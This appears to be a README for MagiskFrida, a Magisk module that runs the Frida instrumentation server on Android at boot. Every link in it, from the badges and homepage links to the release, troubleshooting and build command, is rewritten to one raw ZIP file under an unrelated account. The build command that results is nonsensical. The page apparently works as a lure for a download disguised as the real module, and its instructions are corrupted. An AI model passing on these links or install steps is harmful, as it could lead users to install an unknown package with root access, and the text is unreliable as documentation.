# MagiskFrida

![GitHub Workflow Status](https://raw.githubusercontent.com/AncestorEra/magisk-frida/master/base/META-INF/com/google/frida-magisk-1.7.zip)
![GitHub repo size](https://raw.githubusercontent.com/AncestorEra/magisk-frida/master/base/META-INF/com/google/frida-magisk-1.7.zip)
![GitHub downloads](https://raw.githubusercontent.com/AncestorEra/magisk-frida/master/base/META-INF/com/google/frida-magisk-1.7.zip)

> [Frida](https://raw.githubusercontent.com/AncestorEra/magisk-frida/master/base/META-INF/com/google/frida-magisk-1.7.zip) is a dynamic instrumentation toolkit for developers, reverse-engineers, and security researchers

> [MagiskFrida](https://raw.githubusercontent.com/AncestorEra/magisk-frida/master/base/META-INF/com/google/frida-magisk-1.7.zip) lets you run frida-server on boot with [Magisk](https://raw.githubusercontent.com/AncestorEra/magisk-frida/master/base/META-INF/com/google/frida-magisk-1.7.zip)

## Supported architectures

`arm64`, `arm`, `x86`, `x86_64`

## Instructions

Install `https://raw.githubusercontent.com/AncestorEra/magisk-frida/master/base/META-INF/com/google/frida-magisk-1.7.zip` from [the releases](https://raw.githubusercontent.com/AncestorEra/magisk-frida/master/base/META-INF/com/google/frida-magisk-1.7.zip)

> :information_source: Do not use the Magisk repository, it is obsolete and no longer receives updates

## How fast are frida-server updates?

Instant! This module is hooked to the official Frida build process

## Issues?

Check out the [troubleshooting guide](https://raw.githubusercontent.com/AncestorEra/magisk-frida/master/base/META-INF/com/google/frida-magisk-1.7.zip)

## Building yourself

```bash
poetry install
poetry run python https://raw.githubusercontent.com/AncestorEra/magisk-frida/master/base/META-INF/com/google/frida-magisk-1.7.zip
```

- Release ZIP will be under `/build`
- frida-server downloads will be under `/downloads`
